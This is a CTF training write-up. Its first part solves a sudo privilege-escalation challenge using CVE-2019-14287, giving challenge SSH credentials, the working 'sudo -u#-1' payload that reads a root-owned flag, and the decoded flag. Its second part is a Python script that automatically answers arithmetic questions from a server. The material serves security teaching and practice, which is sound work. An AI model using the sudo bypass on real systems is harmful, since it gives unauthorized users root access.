## Reader

> Salam jumaat @everyone, here jumaats challenge. It is privilege escalation based on CVE-2019-14287. Feel free to check it out :).
> Privilege escalation is the process by which a user gains elevated access to resources that are normally protected from that user's standard capabilities. This can occur in two main forms:
> Vertical Privilege Escalation: A lower-privileged user gains the permissions of a higher-privileged user, such as a regular user becoming an administrator.
> Horizontal Privilege Escalation: A user gains the permissions of another user with the same privilege level, often to access information or resources they are not authorized to access.
> Privilege escalation can happen due to system vulnerabilities, misconfigurations, or through exploitation of application bugs. It's a critical security issue as it can allow unauthorized users to compromise the entire system or network.
> Creds :
> ssh [ctf-player@ice-training.syamilyusof.com](mailto:ctf-player@ice-training.syamilyusof.com) -p 2222
> Password : verysecure
> Dockerfile : https://drive.google.com/file/d/1dkbyr81Ji2rmwYn6npOGKQPzM-3LE75y/view?usp=drive_link

1. This challenge based on CVE-2019-14287
    
    <aside>
    > 💡 In Sudo before 1.8.28, an attacker with access to run as ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.
    
    </aside>
    
2. To solve this challenge first we need to connect to the challenge using ssh
3. Now we can do sudo -l
    
    <aside>
    > 💡 sudo -l command is used to list the commands that a user is allowed to run using 'sudo
    </aside>


```bash
ctf-player@d86f88d61095:~$ sudo -l
Password: 
User ctf-player may run the following commands on d86f88d61095:
    (ALL, !root) /bin/base64
```
    

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/703f9dd9-36fd-453d-93d3-099f508c8cdf/263919ba-ea01-4c27-9f7f-c8006042f8d9/Untitled.png)

1. The `(ALL, !root) /bin/base64` means that user(ctf-player) in this case can run the /bin/base64 command as any user except root. Base64 command can do some encode and decode in base64.
2. Now we can craft our payload to run as user `-u#-1` in this case Sudo treat it as 0 which is root. 
    1. Payload : `sudo -u#-1 base64 /root/flag.txt`
    2. Explanation : This command encodes the contents of `/root/flag` using Base64 encoding as `root` privileges through sudo.
```bash
ctf-player@d86f88d61095:~$ sudo -u#-1 base64 /root/flag.txt
RWFzeSBodWg/IEhlcmUgdGhlIGZsYWcgOiBJQ0V7dGhAbmtmdTExeV90aDFzX0NWRV9hcmVfcEB0
Y2gzZH0K
```
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/703f9dd9-36fd-453d-93d3-099f508c8cdf/cb1b164b-d24d-4164-8af9-b59920c0214a/Untitled.png)
    
3. Now we can decode it using `base64 -d`

```bash
ctf-player@d86f88d61095:~$ sudo -u#-1 base64 /root/flag.txt | base64 -d                                
Easy huh? Here the flag : ICE{th@nkfu11y_th1s_CVE_are_p@tch3d}
```


## Math Genius

```python
import socket

def solve_question(question):
    try:
        # Split the question to extract numbers and operator
        parts = question.strip().split(' ')
        num1 = float(parts[4])
        operator = parts[5]
        num2 = float(parts[6].rstrip('?'))

        # Calculate based on the operator
        if operator == '+':
            return num1 + num2
        elif operator == '-':
            return num1 - num2
        elif operator == '*':
            return num1 * num2
        elif operator == '/':
            return num1 / num2
        else:
            print(f"Unknown operator: {operator}")
            return None

    except (IndexError, ValueError) as e:
        print(f"Error parsing question: {question}")
        print(e)
        return None

def main():
    host = 'ice-training.syamilyusof.com'
    port = 30788

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            welcome_message = s.recv(1024).decode().strip()
            print(welcome_message)  # Welcome message

            s.sendall(b'y\n')
            start_message = s.recv(1024).decode().strip()
            print(start_message)  # Confirmation message

            for i in range(100):
                try:
                    data = s.recv(1024).decode().strip()
                    print(data)  # Print all received data for debugging

                    # Split data to handle multiple lines
                    lines = data.split('\n')

                    for line in lines:
                        if "Question" in line:
                            question = line.strip()
                            print(question)  # Print question for debugging
                            answer = solve_question(question)
                            if answer is not None:
                                s.sendall(f"{answer}\n".encode())
                                response = s.recv(1024).decode().strip()
                                if "Correct" in response:
                                    print("Correct answer received.")
                                else:
                                    print("Unexpected message from server:")
                                    print(response)
                                    return
                            else:
                                print("Failed to parse the question.")
                                return
                        elif "Great! Answer 100 questions correctly to win." in line:
                            continue  # Skip this line, as it's not part of the question
                        elif line.strip() == "":
                            continue  # Skip empty lines
                        else:
                            print("Unexpected message from server:")
                            print(line)
                            return
                except Exception as e:
                    print(f"An error occurred: {e}")
                    return

        except Exception as e:
            print(f"Connection error: {e}")

if __name__ == "__main__":
    main()
```
